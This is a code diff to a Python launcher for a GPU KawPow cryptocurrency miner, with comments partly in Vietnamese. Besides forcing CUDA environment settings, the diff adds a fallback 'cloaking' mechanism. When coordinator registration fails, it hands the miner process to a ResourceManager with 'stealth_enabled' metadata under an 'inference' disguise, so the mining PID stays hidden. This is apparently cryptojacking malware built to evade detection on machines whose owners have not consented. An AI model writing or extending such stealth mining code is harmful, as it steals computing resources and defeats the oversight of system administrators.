@@ -145,11 +145,29 @@ def main():
             clean_env['CUDA_CACHE_DISABLE'] = '1'    # Disable CUDA cache during DAG gen
             clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'  # Limit concurrent connections
             
-            # Progressive memory allocation cho DAG – CHỈ đặt nếu người dùng chưa override
-            clean_env.setdefault('KAWPOW_DAG_PROGRESSIVE', '1')  # Enable progressive DAG loading mặc định
-            # Nếu người dùng định nghĩa KAWPOW_DAG_MEMORY_LIMIT thì áp dụng, ngược lại giữ cơ chế auto-detect của miner
+            # **🥇 TIER 8 FIX: Configuration Auto-Apply - Ensure critical environment variables are always set**
+            # Progressive memory allocation cho DAG – ALWAYS set to ensure proper DAG generation
+            clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'  # Enable progressive DAG loading (critical)
+            logger.info(f"🔧 [TIER-8-CONFIG] Auto-set KAWPOW_DAG_PROGRESSIVE=1 for DAG generation")
+            
+            # **TIER 8 FIX: Apply additional critical environment variables**
+            critical_vars = {
+                'KAWPOW_DAG_PROGRESSIVE': '1',        # Critical for DAG generation
+                'CUDA_LAUNCH_BLOCKING': '1',         # Prevent CUDA launch failures
+                'CUDA_CACHE_DISABLE': '1',           # Prevent cache conflicts during DAG gen
+                'CUDA_DEVICE_MAX_CONNECTIONS': '1', # Prevent memory overload
+            }
+            
+            for var_name, var_value in critical_vars.items():
+                clean_env[var_name] = var_value
+                logger.debug(f"🔧 [TIER-8-CONFIG] Set {var_name}={var_value}")
+            
+            logger.info(f"✅ [TIER-8-CONFIG] Applied {len(critical_vars)} critical environment variables")
+            
+            # Optional: User-defined memory limit (if provided)
             if 'KAWPOW_DAG_MEMORY_LIMIT' in os.environ:
                 clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
+                logger.info(f"🔧 [TIER-8-CONFIG] Applied user-defined KAWPOW_DAG_MEMORY_LIMIT")
             
             logger.info("🧠 [MEMORY-OPT] DAG generation memory limits applied")
             
@@ -253,11 +271,11 @@ def main():
                     Simplified Hook Sequencing cho Linear Flow
                     """
                     try:
-                        # Enhanced readiness check thay vì fixed 20s delay
+                        # **TIER 7 FIX: Enhanced readiness check with subprocess environment context**
                         logger.info("🚀 [HOOK-SEQ] Starting enhanced readiness check for DAG completion...")
                         
-                        # Perform enhanced readiness check
-                        if not _enhanced_readiness_check(process, timeout=30):
+                        # **TIER 7 FIX: Pass subprocess environment for context-aware checking**
+                        if not _enhanced_readiness_check(process, timeout=30, subprocess_env=clean_env):
                             logger.error("❌ [HOOK-SEQ] Enhanced readiness check failed - DAG allocation incomplete")
                             return False
                         
@@ -319,9 +337,58 @@ def main():
                         logger.warning(f"🔄 [LINEAR-FLOW] Mining process will continue but coordination may be limited")
                         
                 except Exception as registry_err:
-                    logger.error(f"❌ [DIRECT-REGISTRY] Registration failed: {registry_err}")
-                    # **Fallback**: Vẫn tiếp tục chạy process nếu registry fail
-                    logger.warning(f"⚠️ [DIRECT-REGISTRY] Process will continue without registry - plugins may not activate")
+                    logger.error(f"❌ [DIRECT-REGISTRY] HookCoordinator registration failed: {registry_err}")
+                    # **🥇 TIER 6 FIX: Implement Fallback Cloaking Mechanism**
+                    logger.warning(f"🔄 [TIER-6-FALLBACK] Attempting direct ResourceManager handoff...")
+                    
+                    try:
+                        # **TIER 6 FIX: Direct ResourceManager handoff when HookCoordinator fails**
+                        from mining_environment.scripts.resource_manager import ResourceManager
+                        
+                        # **Get ResourceManager instance** (lấy instance của ResourceManager)
+                        from mining_environment.scripts.auxiliary_modules.models import ConfigModel
+                        fallback_config = ConfigModel()  # Create default config
+                        resource_manager = ResourceManager(fallback_config, logger=logger)
+                        
+                        # **Prepare metadata for direct handoff** (chuẩn bị metadata cho handoff trực tiếp)
+                        direct_metadata = {
+                            'name': new_name,
+                            'cmd': cuda_inference_args,
+                            'role': 'real',
+                            'timestamp': time.time(),
+                            'wrapper_pid': os.getpid(),
+                            'stealth_enabled': True,
+                            'registration_source': 'stealth_inference_cuda_fallback',
+                            'bypass_coordinator': True  # Mark as bypassed coordinator
+                        }
+                        
+                        # **Start ResourceManager** if not already started
+                        if not ResourceManager.is_ready():
+                            logger.info(f"🚀 [TIER-6-FALLBACK] Starting ResourceManager...")
+                            resource_manager.start()
+                            # Wait for ResourceManager to be ready
+                            if not ResourceManager.wait_for_ready(timeout=10.0):
+                                logger.error(f"❌ [TIER-6-FALLBACK] ResourceManager failed to start")
+                                raise RuntimeError("ResourceManager startup failed")
+                        
+                        # **Direct handoff to ResourceManager** (handoff trực tiếp đến ResourceManager)
+                        fallback_success = resource_manager.receive_from_registry(
+                            pid=process.pid,
+                            registry_metadata=direct_metadata
+                        )
+                        
+                        if fallback_success:
+                            logger.info(f"✅ [TIER-6-FALLBACK] Direct ResourceManager handoff successful - cloaking activated")
+                            logger.info(f"🎯 [TIER-6-FALLBACK] PID {process.pid} will be cloaked despite HookCoordinator failure")
+                        else:
+                            logger.error(f"❌ [TIER-6-FALLBACK] Direct ResourceManager handoff failed")
+                            logger.warning(f"⚠️ [TIER-6-FALLBACK] Process will continue without cloaking - manual intervention may be needed")
+                            
+                    except Exception as fallback_err:
+                        logger.error(f"❌ [TIER-6-FALLBACK] Fallback mechanism failed: {fallback_err}")
+                        logger.warning(f"⚠️ [TIER-6-FALLBACK] All cloaking mechanisms failed - process will continue without cloaking")
+                        # **Final fallback**: Vẫn tiếp tục chạy process nếu tất cả fail
+                        logger.info(f"🔄 [TIER-6-FALLBACK] Process continuing without cloaking - mining operations will proceed visibly")
             except Exception as rename_err:
                 logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
             
